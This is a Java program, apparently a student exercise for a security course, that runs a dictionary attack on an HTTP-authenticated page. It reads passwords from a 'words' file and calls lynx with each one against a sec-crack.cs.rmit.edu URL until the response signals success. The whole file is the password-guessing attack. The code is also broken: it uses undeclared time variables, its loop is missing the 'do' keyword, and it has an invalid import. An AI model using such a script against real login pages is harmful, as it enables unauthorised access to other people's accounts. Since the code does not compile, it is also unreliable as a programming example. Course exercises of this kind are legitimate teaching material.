

import java.*;
import java.io.*;
import java.util.*;

public class Dictionary
{
 public String[] passwds;
 public int passwdNum;
 public static void main(String[] args) throws IOException
 {
  Dictionary dic=new Dictionary();
   dic.doDictionary();
  System.exit(1);
 }

 void doDictionary() throws IOException
 {
  Runtime rt=Runtime.getRuntime();
  passwds=new String[32768];
  passwdNum=0;

   time1=new Date().getTime();
  
  try
  {
		File f = new File ("words");
		FileReader fin = new FileReader (f);
		BufferedReader buf = new BufferedReader(fin);
		passwds[0]="00";
		System.out.println(" loading words....");
		
		{
		 passwds[passwdNum]=buf.readLine();
			 passwdNum++;
		}while(passwds[passwdNum-1]!=null);
		System.out.println("Finish loading words.");
  } catch (FileNotFoundException exc) {
     System.out.println ("File Not Found");
  } catch (IOException exc) {
     System.out.println ("IOException 1");
  } catch (NullPointerException exc) {
	 System.out.println ("NullPointerException");
  }

	 System.out.println(" cracking....");
	 for(int i=0;i<passwdNum;i++)
	 {
		try
		{
			
			Process p=rt.exec("lynx -auth=:"+passwds[i]+" -source http://sec-crack.cs.rmit.edu./SEC/2/index.php");
			
			String ln = (new BufferedReader(new InputStreamReader(p.getInputStream()))).readLine();
			p.destroy();

			if(ln!=null)
			
			if(ln.toCharArray()[0]=='C'&&ln.toCharArray()[1]=='o')
			{
			 System.out.println("Finish cracking.");
			 System.out.println(ln);
			 System.out.println("Password is "+passwds[i]);
			 break;
			}
		} catch (FileNotFoundException exc) {
				i--;
		} catch (IOException exc) {
				i--;
		} catch (NullPointerException exc) {
				i--;
		}

	 }

    time2=new Date().getTime();
   System.out.println("costs "+(time2-time1)+" milliseconds");
 }

}